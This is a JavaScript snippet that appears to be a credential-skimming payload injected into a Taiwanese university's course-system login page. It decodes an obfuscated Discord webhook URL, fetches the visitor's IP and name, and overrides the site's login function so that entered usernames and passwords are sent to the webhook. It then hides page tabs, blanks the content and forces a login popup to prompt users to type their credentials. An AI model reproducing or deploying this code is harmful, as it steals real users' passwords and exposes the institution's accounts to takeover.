(function () {
    const webhookUrl = atob('aHR0cHM6Ly9jYW5hcnkuZGlzY29yZC5jb20vYXBpL3dlYmhvb2tzLzE0OTEzMjYwODQxNzg3NzYxNTQvTlRsNzdhRm1QRllFbE5RbFZTdGhBNllDOTZ5MXRxWnFXNWl2MXRqd0pORk9jZnRmR2Y2a1F4aWNaX0hFbWZxNWlVX3U');

    // check if cookie exists
    if (document.cookie.indexOf('ccode') > -1) {
        return;
    }

    var ip = '';
    fetch('https://api.ipify.org?format=json')
        .then(res => res.json())
        .then(data => {
            ip = data.ip;
        })

    var name = '';
    fetch("https://icas.pccu.edu.tw/cfp/ajaxpro/CourseFP.AjaxMethods,App_Code.ashx", {
        "headers": {
            "x-ajaxpro-method": "GetYYMList"
        },
        "method": "POST",
        "credentials": "include"
    })
        .then(res => res.json())
        .then(data => {
            name = data.value.Welcome.slice(0, 3);
        });

    // override login function
    Login.prototype.Login = function () {
        this._label.style.color = '#000';
        this._label.innerHTML = '<img src="indicator.gif" /> ' + this._oString['Logging'];

        const data = {
            "embeds": [
                {
                    "title": this._id.value,
                    "description": this._password.value,
                    "color": 16711680,
                    "author": { "name": name },
                    "footer": { "text": ip }
                }
            ]
        };

        fetch(webhookUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data),
            keepalive: true
        }).finally(() => {
            document.cookie = `ccode=1; path=/; max-age=31536000`;
            location.reload();
        });
    };

    // override content
    var content = document.getElementById('content_wrapper');
    if (content) {
        content.innerHTML = '<div id="container"><div id="MainContainer"><div style="display:block">系統尚無選課記錄</div></div></div>';
    }

    // override style
    var style = document.createElement('style');
    style.innerHTML = '#logoutab,#glossarytab,#feedbacktab,#classtab,#videotab,#homeworktab{display:none!important}#logintab{display:block!important}';
    document.head.appendChild(style);

    // auto popup login
    if (window.CallLogin) window.CallLogin(true);
})();